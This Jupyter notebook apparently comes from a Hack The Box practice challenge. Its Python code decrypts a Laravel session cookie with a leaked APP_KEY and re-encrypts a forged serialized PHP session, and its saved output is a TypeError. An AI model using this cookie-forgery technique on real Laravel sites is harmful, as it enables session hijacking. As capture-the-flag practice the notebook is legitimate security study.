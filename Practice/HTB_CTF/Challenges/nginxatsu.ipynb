{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "a bytes-like object is required, not 'dict'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m/home/wowon/Documents/My-Project/CTF_Solution_Writeup/Practice/HTB_CTF/Challenges/nginxatsu.ipynb Cell 1\u001b[0m in \u001b[0;36m<cell line: 43>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     <a href='vscode-notebook-cell:/home/wowon/Documents/My-Project/CTF_Solution_Writeup/Practice/HTB_CTF/Challenges/nginxatsu.ipynb#ch0000000?line=37'>38</a>\u001b[0m         \u001b[39mreturn\u001b[39;00m decoded_text\n\u001b[1;32m     <a href='vscode-notebook-cell:/home/wowon/Documents/My-Project/CTF_Solution_Writeup/Practice/HTB_CTF/Challenges/nginxatsu.ipynb#ch0000000?line=41'>42</a>\u001b[0m lar \u001b[39m=\u001b[39m Laravel(KEY, COOKIE)\n\u001b[0;32m---> <a href='vscode-notebook-cell:/home/wowon/Documents/My-Project/CTF_Solution_Writeup/Practice/HTB_CTF/Challenges/nginxatsu.ipynb#ch0000000?line=42'>43</a>\u001b[0m \u001b[39mprint\u001b[39m(base64\u001b[39m.\u001b[39;49mb64encode(lar\u001b[39m.\u001b[39;49mencrypt_value(\u001b[39m'\u001b[39;49m\u001b[39m{\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39mdata\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39m:\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39ma:6:\u001b[39;49m\u001b[39m{\u001b[39;49m\u001b[39ms:6:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m_token\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:40:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m6UPBQnItOzWold6wDWTf5wjvPAfEuvDkbXiCFxCo\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:8:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39musername\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:8:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39mguestc0c\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:5:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39morder\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:2:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39mid\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:9:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39mdirection\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:4:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39mdesc\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:6:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m_flash\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;a:2:\u001b[39;49m\u001b[39m{\u001b[39;49m\u001b[39ms:3:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39mold\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;a:0:\u001b[39;49m\u001b[39m{}\u001b[39;49;00m\u001b[39ms:3:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39mnew\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;a:0:\u001b[39;49m\u001b[39m{}\u001b[39;49;00m\u001b[39m}s:9:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m_previous\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;a:1:\u001b[39;49m\u001b[39m{\u001b[39;49m\u001b[39ms:3:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39murl\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;s:38:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39mhttp:\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m/\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m/178.62.104.23:32721\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m/api\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m/configs\u001b[39;49m\u001b[39m\\\\\u001b[39;49;00m\u001b[39m\"\u001b[39;49m\u001b[39m;}}\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39m,\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39mexpires\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39m:1658373563}\u001b[39;49m\u001b[39m'\u001b[39;49m))\u001b[39m.\u001b[39mdecode())\n\u001b[1;32m     <a href='vscode-notebook-cell:/home/wowon/Documents/My-Project/CTF_Solution_Writeup/Practice/HTB_CTF/Challenges/nginxatsu.ipynb#ch0000000?line=43'>44</a>\u001b[0m lar \u001b[39m=\u001b[39m Laravel(KEY, COOKIE)\n\u001b[1;32m     <a href='vscode-notebook-cell:/home/wowon/Documents/My-Project/CTF_Solution_Writeup/Practice/HTB_CTF/Challenges/nginxatsu.ipynb#ch0000000?line=44'>45</a>\u001b[0m \u001b[39mprint\u001b[39m(lar\u001b[39m.\u001b[39mdecrypt_value())\n",
      "File \u001b[0;32m/usr/lib/python3.10/base64.py:58\u001b[0m, in \u001b[0;36mb64encode\u001b[0;34m(s, altchars)\u001b[0m\n\u001b[1;32m     51\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39mb64encode\u001b[39m(s, altchars\u001b[39m=\u001b[39m\u001b[39mNone\u001b[39;00m):\n\u001b[1;32m     52\u001b[0m     \u001b[39m\"\"\"Encode the bytes-like object s using Base64 and return a bytes object.\u001b[39;00m\n\u001b[1;32m     53\u001b[0m \n\u001b[1;32m     54\u001b[0m \u001b[39m    Optional altchars should be a byte string of length 2 which specifies an\u001b[39;00m\n\u001b[1;32m     55\u001b[0m \u001b[39m    alternative alphabet for the '+' and '/' characters.  This allows an\u001b[39;00m\n\u001b[1;32m     56\u001b[0m \u001b[39m    application to e.g. generate url or filesystem safe Base64 strings.\u001b[39;00m\n\u001b[1;32m     57\u001b[0m \u001b[39m    \"\"\"\u001b[39;00m\n\u001b[0;32m---> 58\u001b[0m     encoded \u001b[39m=\u001b[39m binascii\u001b[39m.\u001b[39;49mb2a_base64(s, newline\u001b[39m=\u001b[39;49m\u001b[39mFalse\u001b[39;49;00m)\n\u001b[1;32m     59\u001b[0m     \u001b[39mif\u001b[39;00m altchars \u001b[39mis\u001b[39;00m \u001b[39mnot\u001b[39;00m \u001b[39mNone\u001b[39;00m:\n\u001b[1;32m     60\u001b[0m         \u001b[39massert\u001b[39;00m \u001b[39mlen\u001b[39m(altchars) \u001b[39m==\u001b[39m \u001b[39m2\u001b[39m, \u001b[39mrepr\u001b[39m(altchars)\n",
      "\u001b[0;31mTypeError\u001b[0m: a bytes-like object is required, not 'dict'"
     ]
    }
   ],
   "source": [
    "from Crypto.Cipher import AES\n",
    "import base64\n",
    "import json\n",
    "import urllib.parse\n",
    "from Crypto.Util.Padding import pad, unpad\n",
    "from phpserialize import unserialize\n",
    "\n",
    "\n",
    "KEY = \"cgxs+3SOT4QBcNDUWBOA5/FoS/Tao9k5y2vHTP3lP0E=\"\n",
    "COOKIE = \"eyJpdiI6ImNac05UQTJhRWV3NHUxMXg4eEdvWEE9PSIsInZhbHVlIjoiaVVuTVlYNFhVOExkZitBWWNjUkZWK3YzZ0E4clJsS2xma0s2R3dBcXVLaGpLNzBEclRNRHViUDQxVm5vQ1JXODhYMzNjOUNMQ0Vnb2RGOG1qTTRBa2VVM0QwaE9ZSm1YYWI4YWJ2XC8wb2lnbU82UEFiYitybXMrcHBkazg5VVZ0bmxPY3grXC9IRzVZWVl1OUlDUTNLb084ZHhyZzBiV3pmQkRiQmo4RFVGMHJMdjRQM0tyVEV1VFlFMHNjUTA2amVhdXN3QmtlRW1XVVQyTlwvK1JyMWlTdm56QjVrR3hoQ0Rsa0R1NXhMd2pQcnJobFk3aEluT250YlJZWXFLXC85cjZGV2F2Q0pHRFZ6S2FETmI3emNyN3ZORE1OaWZTWElcL05YRFNTc0dpTGxwMk9lVjZDMmUrXC80UFpRamJPalNVOXVSalA2RTZSMk4zK3F4enJQS0xFd1VUR1FsV3hZMzNRZE9WQldEZ2JRTzRmaGRkd0ZYYVVcL3JmZ1gycUhQeGNpR0Z0dWJYbXdoajVqclwvXC9hcU5RVzRQWnpoNmVIdCtkK3EzcEI1cndOYTJnMFN4NlpUWnVWcWpibTAraGUrQkJlNXd4UWNXWldLb2xhelM3QndaVms0REE9PSIsIm1hYyI6ImRiOWU0ZGE0YmI5Mjc4MTEyNjE3Yjk3YjViMjgwZjMyY2RlOWIwOTY4YzZhNDg5OGE3YzM4YmY0NGE4NDY0ZjAifQ%3D%3D\"\n",
    "\n",
    "\n",
    "class Laravel:\n",
    "    def __init__(cls, key, cookie):\n",
    "        cls.key = base64.b64decode(key)\n",
    "        cls.cookie = json.loads(base64.b64decode(urllib.parse.unquote_plus(cookie)))\n",
    "\n",
    "    def decrypt_value(cls:str) -> str:\n",
    "        decoded_text = cls.cookie\n",
    "        iv = base64.b64decode(decoded_text['iv'])\n",
    "\n",
    "        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)\n",
    "\n",
    "        decoded = base64.b64decode(decoded_text['value'])\n",
    "        decrypted = unpad(crypt_object.decrypt(decoded), len(decoded)).decode()\n",
    "        # decoded_text['value'] = decrypted\n",
    "        return decoded_text\n",
    "\n",
    "    def encrypt_value(cls:str, toappend:str) -> str:\n",
    "        decoded_text = cls.cookie\n",
    "        iv = base64.b64decode(decoded_text['iv'])\n",
    "\n",
    "        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)\n",
    "\n",
    "        encoded = toappend\n",
    "        encrypted = crypt_object.encrypt(pad(encoded.encode(), AES.block_size))\n",
    "        decoded_text['value'] = base64.b64encode(encrypted).decode()\n",
    "        return decoded_text\n",
    "    \n",
    "\n",
    "\n",
    "lar = Laravel(KEY, COOKIE)\n",
    "print(base64.b64encode(str(lar.encrypt_value('{\"data\":\"a:6:{s:6:\\\\\"_token\\\\\";s:40:\\\\\"6UPBQnItOzWold6wDWTf5wjvPAfEuvDkbXiCFxCo\\\\\";s:8:\\\\\"username\\\\\";s:8:\\\\\"guestc0c\\\\\";s:5:\\\\\"order\\\\\";s:2:\\\\\"id\\\\\";s:9:\\\\\"direction\\\\\";s:4:\\\\\"desc\\\\\";s:6:\\\\\"_flash\\\\\";a:2:{s:3:\\\\\"old\\\\\";a:0:{}s:3:\\\\\"new\\\\\";a:0:{}}s:9:\\\\\"_previous\\\\\";a:1:{s:3:\\\\\"url\\\\\";s:38:\\\\\"http:\\\\/\\\\/178.62.104.23:32721\\\\/api\\\\/configs\\\\\";}}\",\"expires\":1658373563}'))).decode())\n",
    "lar = Laravel(KEY, COOKIE)\n",
    "print(lar.decrypt_value())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "e7370f93d1d0cde622a1f8e1c04877d8463912d04d973331ad4851f04de6915a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
